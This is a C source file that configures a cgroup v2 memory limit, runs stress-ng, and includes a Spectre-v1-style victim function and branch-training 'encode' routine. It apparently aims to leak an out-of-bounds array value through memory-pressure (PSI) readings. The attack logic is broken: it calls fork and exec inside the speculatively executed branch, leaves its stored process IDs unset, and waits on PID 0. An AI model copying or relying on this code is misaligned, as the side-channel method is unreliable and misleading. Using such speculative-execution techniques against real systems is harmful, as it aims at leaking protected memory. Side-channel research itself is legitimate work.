#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>

#define CGROUP_PATH "/sys/fs/cgroup/memory_stress"  // Custom path for the cgroup
#define MEMORY_LIMIT "1G"  // Memory limit to be set for the cgroup (1GB in this case)

pid_t stress_ng_pid1 = 0;  // PID for the first stress-ng process
pid_t stress_ng_pid2 = 0;  // PID for the second stress-ng process


/**
 * Signal handler for graceful shutdown.
 * Ensures that stress-ng is terminated if it is running before exiting the program.
 */
void handle_signal(int sig) {
    if (stress_ng_pid1 > 0) {
        // If the first stress-ng is running, terminate it gracefully
        printf("\nTerminating stress-ng (PID %d)...\n", stress_ng_pid1);
        kill(stress_ng_pid1, SIGTERM);  // Send SIGTERM to terminate the first stress-ng process
        waitpid(stress_ng_pid1, NULL, 0);  // Wait for the first stress-ng process to terminate
    }
    if (stress_ng_pid2 > 0) {
        // If the second stress-ng is running, terminate it gracefully
        printf("\nTerminating stress-ng (PID %d)...\n", stress_ng_pid2);
        kill(stress_ng_pid2, SIGTERM);  // Send SIGTERM to terminate the second stress-ng process
        waitpid(stress_ng_pid2, NULL, 0);  // Wait for the second stress-ng process to terminate
    }
    exit(0);  // Exit the program after termination
}

/**
 * Assigns the current process (specified by its PID) to the cgroup
 * by writing its PID to `cgroup.procs`.
 */
void assign_to_cgroup(pid_t pid) {
    char procs_path[256];  // Path to the cgroup.procs file for the cgroup
    snprintf(procs_path, sizeof(procs_path), "%s/cgroup.procs", CGROUP_PATH);

    FILE *fp = fopen(procs_path, "a");  // Open the cgroup.procs file in append mode
    if (!fp) {
        perror("Failed to open cgroup.procs");  // Print error if the file cannot be opened
        exit(1);
    }
    fprintf(fp, "%d\n", pid);  // Write the PID of the process to the file
    fclose(fp);  // Close the file after writing
    printf("Assigned PID %d to cgroup.\n", pid);  // Inform the user that the process has been assigned to the cgroup
}

/**
 * Creates the cgroup directory at `/sys/fs/cgroup/memory_stress` if it doesn't already exist.
 * This will allow us to manage processes under this cgroup for memory control.
 */
void create_cgroup_if_not_exists() {
    // Try to create the cgroup directory, and check if it already exists (EEXIST error)
    if (mkdir(CGROUP_PATH, 0755) != 0 && errno != EEXIST) {
        perror("Failed to create cgroup directory");
        exit(1);  // Exit if directory creation fails
    }
    printf("Cgroup ready at: %s\n", CGROUP_PATH);  // Confirm the cgroup directory has been created
}

/**
 * Enables the memory controller for the cgroup by writing to `cgroup.subtree_control`.
 * This allows us to manage memory usage for processes in the cgroup.
 */
void enable_memory_controller() {
    FILE *fp = fopen("/sys/fs/cgroup/cgroup.subtree_control", "a");  // Open the subtree_control file to modify cgroup controllers
    if (!fp) {
        perror("Failed to enable memory controller");
        exit(1);  // Exit if the file cannot be opened
    }
    fprintf(fp, "+memory\n");  // Enable the memory controller for the cgroup
    fclose(fp);  // Close the file after writing
    printf("Memory controller enabled.\n");  // Inform the user that the memory controller has been enabled
}

/**
 * Sets the memory limit for the cgroup by writing to the `memory.max` file.
 * This limits the memory usage for processes inside the cgroup.
 */
void set_memory_limit() {
    char limit_path[256];  // Path to the memory.max file for the cgroup
    snprintf(limit_path, sizeof(limit_path), "%s/memory.max", CGROUP_PATH);

    FILE *fp = fopen(limit_path, "w");  // Open the memory.max file to set the limit
    if (!fp) {
        perror("Failed to set memory limit");
        exit(1);  // Exit if the file cannot be opened
    }
    fprintf(fp, "%s\n", MEMORY_LIMIT);  // Set the memory limit (e.g., 1GB)
    fclose(fp);  // Close the file after writing
    printf("Memory limit set to %s\n", MEMORY_LIMIT);  // Inform the user of the set memory limit
}

/**
 * Runs `stress-ng` to allocate memory inside the cgroup.
 * This helps to test the memory limit by generating memory pressure.
 */
void run_stress_ng(int memory_limit_mb) {
    printf("Starting stress-ng to allocate %d MiB...\n", memory_limit_mb);

    char stress_args[256];  // Command-line arguments for stress-ng
    snprintf(stress_args, sizeof(stress_args), "%dM", memory_limit_mb);  // Format memory limit in MB for stress-ng

    pid_t stress_ng_pid = fork();  // Fork a new process to run stress-ng
    if (stress_ng_pid == 0) {
        // In child process: execute stress-ng
        execlp("stress-ng", "stress-ng", "--vm-bytes", stress_args, "--vm-keep", "-m", "1", NULL);
        perror("Failed to start stress-ng");  // If execlp fails, print an error
        exit(1);  // Exit if stress-ng cannot be started
    }

    // In parent process, assign the child to the cgroup and store the PID
    assign_to_cgroup(stress_ng_pid);  // Assign the stress-ng process to the cgroup
    printf("Assigned PID %d to cgroup.\n", stress_ng_pid);
}

//code that runs on P1 (i.e., victim)
char array[16];   	// Buffer (non-zero data)
int array_size = 16;  // Bounds check variable (cached initially)

//the x passed here is either train for j=5,4,3,2 or malicious_x when j=0
void victim_function(int x) {
    if (x < array_size) {  //Bounds check (exploited speculatively)
        if (array[x] == 0) {
            run_stress_ng(1024); //You will see PSI values
        } else {
            run_stress_ng(0);  //You should see PSI values to be 0
        }
    }
}

void encode(int malicious_x, int train) {
    // Train branch predictor to mispredict and trigger speculative execution
    for (int j = 5; j >= 0; j--) {
        // Manipulate x to train branch predictor (legitimate x) or inject malicious_x (j=0)
        int x = ((j % 6) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = train ^ (x & (malicious_x ^ train));

        victim_function(x);  //Execute victim_function speculatively
    }
}

int main() {
    // Set up signal handlers to catch Ctrl+C (SIGINT) and termination (SIGTERM)
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    create_cgroup_if_not_exists();  // Create the cgroup if it doesn't already exist
    enable_memory_controller();  // Enable the memory controller for the cgroup
    set_memory_limit();  // Set the memory limit for the cgroup

    // Run two stress-ng processes concurrently to allocate 1024MB each
    run_stress_ng(1024);  // Run the first stress-ng process with 1GB memory allocation
    //run_stress_ng(1024);  // Run the second stress-ng process with 1GB memory allocation

    encode(112, 10);

    // Wait for both stress-ng processes to complete
    waitpid(stress_ng_pid1, NULL, 0);  // Wait for the first stress-ng process
    waitpid(stress_ng_pid2, NULL, 0);  // Wait for the second stress-ng process

    printf("Both stress-ng processes completed.\n");

    return 0;  // Exit the program
}
